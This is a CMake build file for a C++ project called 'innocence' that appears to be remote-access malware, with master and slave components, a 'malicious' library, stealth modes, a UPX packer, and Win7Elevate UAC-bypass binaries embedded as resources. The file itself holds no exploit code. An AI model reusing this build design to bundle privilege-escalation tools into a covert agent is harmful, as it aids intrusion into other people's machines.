# Visual Studio 2012 well supported
cmake_minimum_required(VERSION 2.8.1)
# innocence is entirely in C++ (or almost) !
project(innocence CXX)

# the debug flag in innocence modifies the behavior of logging
# and stealth modes
if ( CMAKE_BUILD_TYPE MATCHES Debug)
	message(STATUS "Debug mode enabled")
	add_definitions(-DINNOCENCE_DEBUG)
elseif( CMAKE_BUILD_TYPE MATCHES Release)
	message(STATUS "Release mode enabled")	
endif ()

# Installation directory of Qt
set(QT_INSTALL_DIR "C:\\Qt\\Qt5.1.0\\5.1.0\\msvc2012")

# For Visual Studio
# the jpeg library needs it to be linked with project
add_definitions(-D_CRT_SECURE_NO_WARNINGS)
set(CMAKE_EXE_LINKER_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /SAFESEH:NO")
set(CMAKE_SHARED_LINKER_FLAGS "${CMAKE_SHARED_LINKER_FLAGS} /SAFESEH:NO")
set(CMAKE_MODULE_LINKER_FLAGS "${CMAKE_MODULE_LINKER_FLAGS} /SAFESEH:NO")

#set(CMAKE_CXX_FLAGS_RELEASE "${CMAKE_CXX_FLAGS_RELEASE} /MD")
#set(CMAKE_CXX_FLAGS_DEBUG "${CMAKE_CXX_FLAGS_DEBUG} /MDd")

if ( CMAKE_BUILD_TYPE MATCHES Debug)
	set(BUILD_FLAGS_MD "/MDd")
	set(BUILD_FLAGS_MT "/MTd")
elseif( CMAKE_BUILD_TYPE MATCHES Release)
	set(BUILD_FLAGS_MD "/MD")
	set(BUILD_FLAGS_MT "/MT")
endif ()

# hack to get around the "Debug" and "Release" directories cmake tries to add on Windows
if (MSVC_IDE)
	message(STATUS "IDE Visual Studio detected")
    set_target_properties (${NAME} PROPERTIES PREFIX "../")
endif()

# we separate source, build and binaries
set(BINARY_OUTPUT "${CMAKE_SOURCE_DIR}/../bin")
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${BINARY_OUTPUT})
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY_RELEASE ${BINARY_OUTPUT})
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY_DEBUG ${BINARY_OUTPUT}) 
set(MODULE_OUTPUT_DIRECTORY ${BINARY_OUTPUT})
set(RUNTIME_OUTPUT_DIRECTORY ${BINARY_OUTPUT})
set(EXECUTABLE_OUTPUT_PATH ${BINARY_OUTPUT})
set(LIBRARY_OUTPUT_PATH ${BINARY_OUTPUT})
set(PROJECT_BINARY_DIR ${BINARY_OUTPUT})

include_directories(${BINARY_OUTPUT})
include_directories(${CMAKE_SOURCE_DIR})
include_directories(${CMAKE_SOURCE_DIR}/lib)

message(STATUS "Additional include : ${CMAKE_SOURCE_DIR}")
message(STATUS "Debug output in : ${CMAKE_RUNTIME_OUTPUT_DIRECTORY_DEBUG}")
message(STATUS "Release output in : ${CMAKE_RUNTIME_OUTPUT_DIRECTORY_RELEASE}")
message(STATUS "Build in : ${PROJECT_BINARY_DIR}")
message(STATUS "Sources in : ${PROJECT_SOURCE_DIR}")
message(STATUS "Runtime in : ${RUNTIME_OUTPUT_DIRECTORY}")
message(STATUS "Modules output in : ${MODULE_OUTPUT_DIRECTORY}")

# ressource generator will create headers with binary resources
set(BUILDNUMBER "${CMAKE_SOURCE_DIR}/utils/buildnum.exe")
set(BINGENERATOR "${CMAKE_SOURCE_DIR}/utils/bin2array.exe")
set(COMPRESSOR "${CMAKE_SOURCE_DIR}/utils/upx.exe")

set(SLAVE_DLL_HPP_PATH "${BINARY_OUTPUT}/SlaveDll.hpp")
set(SLAVE_DLL_PATH "${BINARY_OUTPUT}/slave_dll.dll")

set(ELEVATOR32_HPP_PATH "${BINARY_OUTPUT}/Elevator32.hpp")
set(ELEVATOR32_EXE_PATH "${CMAKE_SOURCE_DIR}/utils/elevator/Win32/Release/Win7Elevate32v2.exe")

set(ELEVATORDLL32_HPP_PATH "${BINARY_OUTPUT}/ElevatorDll32.hpp")
set(ELEVATORDLL32_DLL_PATH "${CMAKE_SOURCE_DIR}/utils/elevator/Win32/Release/Win7ElevateDll32.dll")

set(ELEVATOR64_HPP_PATH "${BINARY_OUTPUT}/Elevator64.hpp")
set(ELEVATOR64_EXE_PATH "${CMAKE_SOURCE_DIR}/utils/elevator/x64/Release/Win7Elevate64v2.exe")

set(ELEVATORDLL64_HPP_PATH "${BINARY_OUTPUT}/ElevatorDll64.hpp")
set(ELEVATORDLL64_DLL_PATH "${CMAKE_SOURCE_DIR}/utils/elevator/x64/Release/Win7ElevateDll64.dll")

message(STATUS "BINGENERATOR = ${BINGENERATOR}")
message(STATUS "BUILDNUMBER = ${BUILDNUMBER}")

message(STATUS "SLAVE_DLL_HPP_PATH = ${SLAVE_DLL_HPP_PATH}")
message(STATUS "SLAVE_DLL_PATH = ${SLAVE_DLL_PATH}")

message(STATUS "ELEVATOR32_HPP_PATH = ${ELEVATOR32_HPP_PATH}")
message(STATUS "ELEVATOR32_EXE_PATH = ${ELEVATOR32_EXE_PATH}")

message(STATUS "ELEVATORDLL32_HPP_PATH = ${ELEVATORDLL32_HPP_PATH}")
message(STATUS "ELEVATORDLL32_DLL_PATH = ${ELEVATORDLL32_DLL_PATH}")

message(STATUS "ELEVATOR64_HPP_PATH = ${ELEVATOR64_HPP_PATH}")
message(STATUS "ELEVATOR64_EXE_PATH = ${ELEVATOR64_EXE_PATH}")

message(STATUS "ELEVATORDLL64_HPP_PATH = ${ELEVATORDLL64_HPP_PATH}")
message(STATUS "ELEVATORDLL64_DLL_PATH = ${ELEVATORDLL64_DLL_PATH}")

add_custom_target(
	innocence ALL "${BUILDNUMBER}" "${CMAKE_SOURCE_DIR}/Build.hpp"
	DEPENDS "${BUILDNUMBER}" "${CMAKE_SOURCE_DIR}/Build.hpp"
	WORKING_DIRECTORY "${CMAKE_SOURCE_DIR}"
	COMMENT "Execute : ${BUILDNUMBER} ${CMAKE_SOURCE_DIR}/Build.hpp"
	VERBATIM
	SOURCES Build.hpp Innocence.hpp
)

add_subdirectory(lib/network)
add_subdirectory(lib/common)
add_subdirectory(lib/system)
if(WIN32)
	add_subdirectory(lib/malicious)
	add_subdirectory(slave)
endif()

add_subdirectory(auditor)
add_subdirectory(lib/blaspheme)
add_subdirectory(utils/logger)
add_subdirectory(master)

# Audit unit
if ( CMAKE_BUILD_TYPE MATCHES Debug)
	add_subdirectory(testing)
endif()

# Package generation
#include(InstallRequiredSystemLibraries)

#set(CPACK_GENERATOR "ZIP")
#set(CPACK_PACKAGE_DESCRIPTION_SUMMARY "innocence")
#set(CPACK_PACKAGE_VENDOR "CrunchEngine")
# set(CPACK_PACKAGE_DESCRIPTION_FILE "${CMAKE_SOURCE_DIR}/../documentation/ReadMe.txt")
# set(CPACK_RESOURCE_FILE_LICENSE "${CMAKE_SOURCE_DIR}/../documentation/Copyright.txt")
#set(CPACK_PACKAGE_VERSION "1.0.0")
#set(CPACK_PACKAGE_VERSION_MAJOR "1")
#set(CPACK_PACKAGE_VERSION_MINOR "0")
#set(CPACK_PACKAGE_VERSION_PATCH "0")
#set(CPACK_PACKAGE_INSTALL_DIRECTORY "CMake ${CMake_VERSION_MAJOR}.${CMake_VERSION_MINOR}")
#set(CPACK_PACKAGE_ICON "${CMAKE_SOURCE_DIR}\\\\thesleeper\\\\images\\\\biohazard.jpg")
#set(CPACK_PACKAGE_EXECUTABLES "" "thesleeper.exe")

#if(WIN32 AND NOT UNIX)
	# Génération du package pour windows
#else(WIN32 AND NOT UNIX)
	# Génération du package pour linux
#endif(WIN32 AND NOT UNIX)

#include(CPack)
